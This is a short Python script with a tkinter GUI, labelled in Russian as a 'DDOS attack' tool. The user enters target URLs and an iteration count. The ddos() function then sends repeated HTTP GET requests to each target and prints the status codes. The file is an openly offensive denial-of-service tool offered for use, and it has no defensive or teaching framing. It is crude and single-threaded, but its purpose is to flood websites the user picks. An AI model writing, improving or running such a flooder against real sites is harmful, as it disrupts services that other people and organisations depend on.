import tkinter
import requests

from setwindow import SetWindow


def add_url(event):    
    URLs.append(f"http://{entry.get()}".replace(" ", ""))    
    label3.config(text=URLs)
    entry.delete(0, tkinter.END)
    

def ddos(URLs, how_many_times=10, event=False):
    for url in URLs:
        for j in range(1, int(how_many_times) + 1):
            requests.get(url)
            print(j, j * "*")
        print(f"{url}: Статус код: {requests.get(url).status_code}")


URLs =[]



root = tkinter.Tk()
win = SetWindow(root, 600, 400, "DDOS")


label1 = tkinter.Label(root, text="DDOS атака", font="Arial 30")
label2 = tkinter.Label(root, text="Введите адреса для атаки", font="Arial 15")
label3 = tkinter.Label(root, font="Arial 10", fg="Red")
entry = tkinter.Entry(root, font="Arial 15", width=30, bd=2)
n = tkinter.Entry(root, font="Arial 25", width=5, bd=2)
button_add = tkinter.Button(root, text="Добавить", font="Arial 15")
button_run = tkinter.Button(root, text="АТАКА", font="Arial 18", width=20, bd=3)
label4 = tkinter.Label(root, text="итерации", font="Arial 10")


def run(event=False):
    ddos(URLs, n.get())


entry.bind("<Return>", add_url)
button_add.bind("<Button-1>", add_url)
button_run.bind("<Button-1>", run)


label1.place(relx=0.5, rely=0.01, anchor="n")
label2.place(relx=0.4, rely=0.25, anchor="center")
label3.place(relx=0.5, rely=0.45, anchor="n")
entry.place(relx=0.7, rely=0.35, anchor="e")
label4.place(relx=0.78, rely=0.18, anchor="w")
n.place(relx=0.75, rely=0.1, anchor="w")
button_add.place(relx=0.7, rely=0.35, anchor="w")
button_run.place(relx=0.5, rely=0.7, anchor="n")


win.run()
